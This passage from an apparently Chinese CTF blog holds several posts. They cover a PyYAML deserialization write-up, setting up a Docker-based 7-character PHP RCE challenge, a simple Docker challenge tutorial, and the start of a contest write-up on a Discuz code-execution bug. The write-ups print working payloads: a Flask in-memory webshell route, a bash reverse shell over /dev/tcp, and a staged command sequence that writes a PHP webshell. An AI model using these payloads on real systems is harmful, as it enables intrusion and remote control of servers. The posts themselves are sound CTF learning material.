class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)  </span><br><span class="line">    user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">    comment = Comment(text=text, create_time=create_time, blog_id=blogId, user_id=user.<span class="built_in">id</span>)  </span><br><span class="line">    db.session.add(comment)  </span><br><span class="line">    db.session.commit()  </span><br><span class="line">    <span class="keyword">return</span> &#123;  </span><br><span class="line">        <span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>,  </span><br><span class="line">        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;评论成功！&#x27;</span>,  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/myComment&#x27;</span></span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myComment</span>():  </span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">    user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">    commentList = Comment.query.<span class="built_in">filter</span>(Comment.user_id == user.<span class="built_in">id</span>).order_by(Comment.create_time.desc()).<span class="built_in">all</span>()  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;myComment.html&quot;</span>, commentList=commentList)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/deleteCom/&lt;id&gt;&#x27;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deleteCom</span>(<span class="params"><span class="built_in">id</span></span>):  </span><br><span class="line">    com = Comment.query.<span class="built_in">filter</span>(Comment.<span class="built_in">id</span> == <span class="built_in">id</span>).first()  </span><br><span class="line">    db.session.delete(com)  </span><br><span class="line">    db.session.commit()  </span><br><span class="line">    <span class="keyword">return</span> &#123;  </span><br><span class="line">        <span class="string">&#x27;state&#x27;</span>: <span class="literal">True</span>,  </span><br><span class="line">        <span class="string">&#x27;msg&#x27;</span>: <span class="string">&quot;删除成功！&quot;</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/saying&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@admin_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Saying</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;path&#x27;</span>):  </span><br><span class="line">        file = request.args.get(<span class="string">&#x27;path&#x27;</span>).replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>).replace(<span class="string">&#x27;..\\&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>)  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">                f = f.read()  </span><br><span class="line">                <span class="keyword">if</span> waf(f):  </span><br><span class="line">                    <span class="built_in">print</span>(yaml.load(f, Loader=Loader))  </span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;鲁迅说：当你看到这句话时，还没有拿到flag，那就赶紧重开环境吧&#x27;</span>)  </span><br><span class="line">                <span class="keyword">else</span>:  </span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;鲁迅说：你说得不对&#x27;</span>)  </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;鲁迅说：&#x27;</span>+<span class="built_in">str</span>(e))  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;view/jojo.yaml&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            sayings = yaml.load(f, Loader=Loader)  </span><br><span class="line">            saying = random.choice(sayings)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=saying)</span><br></pre></td></tr></table></figure><p>然后看到blog.py的一个文件上传的路由</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/imgUpload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imgUpload</span>():  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        file = request.files.get(<span class="string">&#x27;editormd-image-file&#x27;</span>)  </span><br><span class="line">        fileName = file.filename.replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">        filePath = os.path.join(<span class="string">&quot;static/upload/&quot;</span>, fileName)  </span><br><span class="line">        file.save(filePath)  </span><br><span class="line">        <span class="keyword">return</span> &#123;  </span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">1</span>,  </span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;上传成功!&#x27;</span>,  </span><br><span class="line">            <span class="string">&#x27;url&#x27;</span>: <span class="string">&quot;/&quot;</span> + filePath  </span><br><span class="line">        &#125;  </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">        <span class="keyword">return</span> &#123;  </span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">0</span>,  </span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;上传失败&#x27;</span>  </span><br><span class="line">        &#125;  </span><br></pre></td></tr></table></figure><p><strong>yaml反序列化绕过</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/saying&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@admin_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Saying</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;path&#x27;</span>):  </span><br><span class="line">        file = request.args.get(<span class="string">&#x27;path&#x27;</span>).replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>).replace(<span class="string">&#x27;..\\&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>)  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">                f = f.read()  </span><br><span class="line">                <span class="keyword">if</span> waf(f):  </span><br><span class="line">                    <span class="built_in">print</span>(yaml.load(f, Loader=Loader))  </span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;鲁迅说：当你看到这句话时，还没有拿到flag，那就赶紧重开环境吧&#x27;</span>)  </span><br><span class="line">                <span class="keyword">else</span>:  </span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;鲁迅说：你说得不对&#x27;</span>)  </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;鲁迅说：&#x27;</span>+<span class="built_in">str</span>(e))  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;view/jojo.yaml&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            sayings = yaml.load(f, Loader=Loader)  </span><br><span class="line">            saying = random.choice(sayings)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=saying)</span><br></pre></td></tr></table></figure><p>我第一次做PYyaml反序列化，先学习一下</p><blockquote><p>yaml.dump()：将一个Python对象序列化生成为yaml文档。<br>yaml.load()：将一个yaml文档反序列化为一个Python对象。<br><strong>检测方法</strong>：<br>Python代码中是否包含“import yaml”，若包含则进一步排查是否调用yaml.load()且参数是可控的。<br><strong>防御方法</strong><br>使用安全函数yaml.safe_load()替代yaml.load()即可解决Pyyaml反序列化漏洞。</p></blockquote><p>然后是利用yaml文件进行命令执行，但是这个题python中的命令执行函数都给ban了，所以不能直接在yaml进行命令执行，但是可以通过yaml来导入其它模块来进行命令执行<br>本题通过<strong>python&#x2F;module</strong>标签来实现，这里有一个点就是上传的文件和执行的文件不在同一目录，通过出题人的wp可知目录层级为&#x2F;static&#x2F;upload&#x2F;上传的文件，当然通过前面的测试也可猜出来，这个时候yaml文件内容就可写成<code>!!python/module:static.upload</code>，从而加载命令执行的模块，这样写你要加载的模块文件名必须命名为<code>__init__.py</code>否则就要在yaml文件中写入你要加载的模块文件名<br><strong>先把上面关于module标签利用过程解释一下，感觉逻辑有些混乱了，自己没太理解</strong></p><blockquote><p>假如有个yaml_test.py文件为<br><code>import os </code><br><code>os.system(&#39;mate-calc&#39;)</code><br>在另一文件simple.py中，依次运行以下load代码<br><code>import yaml </code><br><code>yaml.load(&quot;!!python/module:yaml_test&quot; )  </code>#exp方法是随意写的，是不存在的，但必须要有，因为这是命名规则，不然会报错，主要是文件名yaml_test要写对<code>  </code>yaml.load(“!!python&#x2F;object:yaml_test.exp” )<br><code>yaml.load(&quot;!!python/name:yaml_test.exp&quot; )</code><br>这几条命令都能打开计算器，这里我自己没做测试，yaml版本大于5.1就要加个Loader参数否则执行yaml.load就会报错</p></blockquote><p>上面是要求同一目录，不在同一目录就是本题所用方法，稍微改一下yaml文件文件就行，这样就比较好理解为什么构造yaml文件和__init__.py文件了<br>接下来就是构造__init__.py文件进行命令执行，出题人自己的wp使用的内存马本人还没太了解所以直接用来打一下，就不解释构造了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *  </span><br><span class="line"><span class="built_in">eval</span>(  </span><br><span class="line">    <span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;shell&#x27;)).read())&quot;</span>,  </span><br><span class="line">   &#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>: url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>], <span class="string">&#x27;app&#x27;</span>: url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)  </span><br><span class="line"><span class="comment"># 生成一个shell路由，参数为shell</span></span><br></pre></td></tr></table></figure><p>先将__init__.py传入<br><img src="https://s1.ax1x.com/2022/12/27/zz0vcR.png" alt="zz0vcR.png"><br>这里要注意的是图片上传路由在下面这里，抓本地上传的那个包就行，很傻的一个问题自己在这里卡了半天，得感谢一下<a href="https://www.lengf233.top/">lengf</a>师傅给我解答这么傻的问题<br><img src="https://s1.ax1x.com/2022/12/27/zz0xj1.png" alt="zz0xj1.png"><br>然后上传yaml文件<br><img src="https://s1.ax1x.com/2022/12/27/zz0X9J.png" alt="zz0X9J.png"><br>最后访问<code>blog/saying?path=static/upload/poc1.yaml</code>生成路由，进行命令执行<br><img src="https://s1.ax1x.com/2022/12/27/zz0Lh4.png" alt="zz0Lh4.png"><br>第二个是反弹shell，我这里用的bash反弹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/xxx/2333 0&gt;&amp;1&quot;&#x27;)</span><br></pre></td></tr></table></figure><p>放入__init__.py生成路由时会执行，即可反弹成功<br><img src="https://s1.ax1x.com/2022/12/27/zz0j39.png" alt="zz0j39.png"><br>有时间再沉淀一下，理解的不是很透彻<br>参考：<br><a href="https://pysnow.cn/archives/566/">出题人</a><br><a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#pythonmodule">https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#pythonmodule</a><br><a href="https://www.cnblogs.com/damoxilai/p/16707055.html">https://www.cnblogs.com/damoxilai/p/16707055.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>7字符rce题目搭建</title>
      <link href="/undefined/45179.html"/>
      <url>/undefined/45179.html</url>
      
        <content type="html"><![CDATA[<p><strong>搭建这个题目本意就是想学习一下dockerfile和docker-compose.yml文件的使用，原理讲的不透彻，主要记录一下操作</strong></p><p>首先在本地把解题的源码写完，再上传到服务器<br><img src="https://s1.ax1x.com/2022/12/19/zLikCD.png" alt="zLikCD.png"><br>files下放的是flag.php和index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])&lt;=<span class="number">7</span>)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr/&gt;&#x27;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>if(strlen($_GET[1])&lt;=7)</code>这里我一开始测试用的小于8，然后这里改了也没再测试，意思都一样，然后网上这里用的小于7，这样的话7字符根本就过不了<br>言归正传，我们先看一下dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ctftraining/base_image_nginx_mysql_php_73</span><br><span class="line"></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> Author=<span class="string">&quot;JokerY&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> Blog=<span class="string">&quot;https://joker2763.github.io/&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> files  /var/www/html  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><blockquote><p>FROM就是拉取一个基础镜像<br>LABEL就是打标签，说明作者等<br><code>ENV LANG C.UTF-8</code>这一句就是使用utf-8编码，防止中文乱码，当然在这个题没有中文<br>COPY这里就是把服务器的解题所需文件放到docker容器里面<br>EXPOSE是映射到宿主机的端口，就是暴露容器80端口</p></blockquote><p>然后看一下docker-compose.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">FLAG=flag&#123;This_is_flag&#125;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;2333:80&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>version指明yml文件的版本号<br>services就是yml文件的主体，定义了服务了配置。bulid就是基于dockerfile启动一个容器，后面就是dockerfile路径，这里代表dockerfile和yaml文件在同一路径，environment这个就是弄动态flag，这里我以后往平台上题再学一下操作，ports这里2333表示映射的端口，80这里和dockerfile要一样</p></blockquote><p>这样一个题目搭建就基本完成了，然后再去服务器运行docker-compose.yml文件就可以快速搭建题目了<br><img src="https://s1.ax1x.com/2022/12/19/zLieKA.png" alt="zLieKA.png"><br>可以看到直接执行<code>sudo  docker-compose up -d</code>就可以快速起一个环境，而且这里创建了一个rce-web-1镜像，并且这里看到容器创建成功<br>访问一下，看到题目<br><img src="https://s1.ax1x.com/2022/12/19/zLiVvd.png" alt="zLiVvd.png"><br>打一下<br>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt;hp  </span><br><span class="line">&gt;1.p\\  </span><br><span class="line">&gt;d\&gt;\\  </span><br><span class="line">&gt;\ -\\  </span><br><span class="line">&gt;e64\\  </span><br><span class="line">&gt;bas\\  </span><br><span class="line">&gt;7\|\\  </span><br><span class="line">&gt;XSk\\  </span><br><span class="line">&gt;Fsx\\  </span><br><span class="line">&gt;dFV\\  </span><br><span class="line">&gt;kX0\\  </span><br><span class="line">&gt;bCg\\  </span><br><span class="line">&gt;XZh\\  </span><br><span class="line">&gt;AgZ\\  </span><br><span class="line">&gt;waH\\  </span><br><span class="line">&gt;PD9\\  </span><br><span class="line">&gt;o\ \\  </span><br><span class="line">&gt;ech\\  </span><br><span class="line">ls -t&gt;0  </span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure><p>这里可以使用脚本自动执行，但是网上脚本我执行发现一句话写不进去，可能哪里有点问题<br>直接手动吧<br>成功写入<br><img src="https://s1.ax1x.com/2022/12/19/zLiA8e.png" alt="zLiA8e.png"><br>拿到flag，这里也就是flag.php的代码<br><img src="https://s1.ax1x.com/2022/12/19/zLii4O.png" alt="zLii4O.png"><br>不知道为什么蚁剑连不上，可能是我环境有问题，以后搭建文件上传的题目再细细研究一下</p>]]></content>
      
      
      <categories>
          
          <category> Doker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>学习搭建一个简单题</title>
      <link href="/undefined/40470.html"/>
      <url>/undefined/40470.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关于用docker出题的文章实在是太少了，所以自己在学习的时候记录一下<br>docker的一些基本搭建在这里就不一一说明了，这里只记录一下如何把一个题目弄出来，可能有些地方也有错误</p><h2 id="进入主题"><a href="#进入主题" class="headerlink" title="进入主题"></a>进入主题</h2><p>按我自己的理解就是先拉取一个镜像用来布置题目所需的环境以及容器所需<br>我这里使用<code>ctftraining/base_image_nginx_mysql_php_73</code> 这个镜像一开始我用的<code>tutum/lamp</code><br>但是发现这个镜像有点问题不能显示中文，可能是dockerfile没设置<br>拉取镜像<code>docker pull ctftraining/base_image_nginx_mysql_php_73 </code><br>这里我已经拉取了，所以列一下<br><img src="https://s1.ax1x.com/2022/12/15/zo0fQs.png" alt="zo0fQs.png"><br>然后使用ctftraining&#x2F;base_image_nginx_mysql_php_73镜像启动一个容器，同时映射到服务器的2333端口<br><code> docker run -d -p 2333:80 ctftraining/base_image_nginx_mysql_php_73</code><br><img src="https://s1.ax1x.com/2022/12/15/zo0Rzj.png" alt="zo0Rzj.png"><br>可以看到已经启动了一个容器，然后就是弄出题文件了，先上传到服务器的&#x2F;var&#x2F;www&#x2F;html下<br>一个简单的抓包查看源码的题，因为主要是学习怎么布置一个题目，所以直接到网上找的一个源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;p style=<span class="string">&quot;font-family:arial;color:black;font-size:20px;text-align:center;&quot;</span>&gt;Flag不在这里哦&lt;/p&gt;  </span><br><span class="line">&lt;!-- flag&#123;This_is_flag&#125; --&gt;  </span><br><span class="line">&lt;/body&gt;  </span><br><span class="line">&lt;script&gt;  </span><br><span class="line"> document.oncontextmenu=<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">   <span class="title function_ invoke__">alert</span>(<span class="string">&quot;右键被禁用&quot;</span>);  </span><br><span class="line">   <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">  &#125;;  </span><br><span class="line"> document.onkeydown = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;  </span><br><span class="line">    e = window.event || e;  </span><br><span class="line">    <span class="keyword">var</span> k = e.keyCode;  </span><br><span class="line">    <span class="comment">//屏蔽ctrl+u，F12键  </span></span><br><span class="line">    <span class="keyword">if</span> ((e.ctrlKey == <span class="literal">true</span> &amp;&amp; k == <span class="number">85</span>) || k == <span class="number">123</span>) &#123;  </span><br><span class="line">      <span class="keyword">if</span> (k == <span class="number">85</span>)  </span><br><span class="line">        <span class="title function_ invoke__">alert</span>(<span class="string">&quot;Ctrl+U被禁用!&quot;</span>);  </span><br><span class="line">      <span class="keyword">else</span>   </span><br><span class="line">        <span class="title function_ invoke__">alert</span>(<span class="string">&quot;F12被禁用!&quot;</span>);  </span><br><span class="line">      e.keyCode = <span class="number">0</span>;  </span><br><span class="line">      e.returnValue = <span class="literal">false</span>;  </span><br><span class="line">      e.cancelBubble = <span class="literal">true</span>;  </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"> &#125;  </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后把题目的源码从服务器copy到容器中<br><code>docker cp /var/www/html/index.php 603788:/var/www/html/</code><br>容器id不用写全只要能识别出来就行，执行之后访问就行<br>访问<code>服务器ip:2333</code><br><img src="https://s1.ax1x.com/2022/12/15/zo02WQ.png" alt="zo02WQ.png"><br>布置成功<br><img src="https://s1.ax1x.com/2022/12/15/zo0cFS.png" alt="zo0cFS.png"><br>然后抓包得到flag<br><img src="https://s1.ax1x.com/2022/12/15/zo0gJg.png" alt="zo0gJg.png"><br>然后就是dockerfile和docker-compose.yml的编写，用来快速本地部署和动态flag实现等，这里就先不写了,当然那个也是很重要的东西<br>最后这里列一下我最近经常用的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exit //退出容器</span><br><span class="line">systemctl restart docker  //重启docker</span><br><span class="line">docker start 容器id  //开启一个已知id的容器</span><br><span class="line">docker restart 容器id  //重新启动容器</span><br><span class="line">docker exec -it  容器id bash  //退出容器后容器不关闭</span><br><span class="line">docker stop 容器id  //结束容器</span><br><span class="line">docker ps  //查看正在运行的容器</span><br><span class="line">docker image ls  //查看镜像目录</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://blog.csdn.net/Cypher_X/article/details/115359957">CTF Web出题感悟_Wuuconix的博客-CSDN博客_ctf web出题</a><br><a href="https://blog.csdn.net/m0_62422842/article/details/126604577?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-126604577-blog-115359957.pc_relevant_multi_platform_whitelistv4&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-126604577-blog-115359957.pc_relevant_multi_platform_whitelistv4&utm_relevant_index=5">用docker搭建简易ctf题目_XiLitter的博客-CSDN博客_ctf题目docker</a></p>]]></content>
      
      
      <categories>
          
          <category> Doker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>弱口令招新赛wp(部分)</title>
      <link href="/undefined/53909.html"/>
      <url>/undefined/53909.html</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="签到小能手"><a href="#签到小能手" class="headerlink" title="签到小能手"></a>签到小能手</h2><p>直接扫目录发现有个index.php.bak下载打开得到</p><h2 id="开胃菜"><a href="#开胃菜" class="headerlink" title="开胃菜"></a>开胃菜</h2><p>ls根目录看到flag<br><img src="https://s1.ax1x.com/2022/11/19/zuy5qO.png" alt="zuy5qO.png"><br>然后cat，这里好像可以忽略空格，可能是非预期吧，这里也可以用nl直接出来<br><img src="https://s1.ax1x.com/2022/11/19/zuy4sK.png" alt="zuy4sK.png"></p><h2 id="小镇做题家"><a href="#小镇做题家" class="headerlink" title="小镇做题家"></a>小镇做题家</h2><p>扫出来robots.txt，访问&#x2F;GAME&#x2F;index.html查看js代码<br><img src="https://s1.ax1x.com/2022/11/19/zuyWxx.png" alt="zuyWxx.png"><br>base64解码访问&#x2F;GAME&#x2F;f14g_in_there_hha&#x2F;index.php<br>然后GAME&#x2F;f14g_in_there_hha&#x2F;index.php?payload&#x3D;;cat%09&#x2F;*</p><h2 id="Discuz"><a href="#Discuz" class="headerlink" title="Discuz"></a>Discuz</h2><p>参考这篇文章(<a href="https://cloud.tencent.com/developer/article/1541130">Discuz 7.x&#x2F;6.x 全局变量防御绕过导致代码执行漏洞复现 - 腾讯云开发者社区-腾讯云 (tencent.com)</a>)<br>直接访问存在漏洞的地方但是在tid这里困了很久<br><img src="https://s1.ax1x.com/2022/11/19/zuyhM6.png" alt="zuyhM6.png"><br>然后一直找终于又找到一篇博客(<a href="https://www.freebuf.com/vuls/262488.html">discuz7.2漏洞复现–python编写poc - FreeBuf网络安全行业门户</a>)</p><p><img src="https://s1.ax1x.com/2022/11/19/zuyRR1.png" alt="zuyRR1.png"></p><p>直接tid改为10，运气不错拿到shell<br><img src="https://s1.ax1x.com/2022/11/19/zuyTde.png" alt="zuyTde.png"><br>接下来把webshell写入，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; 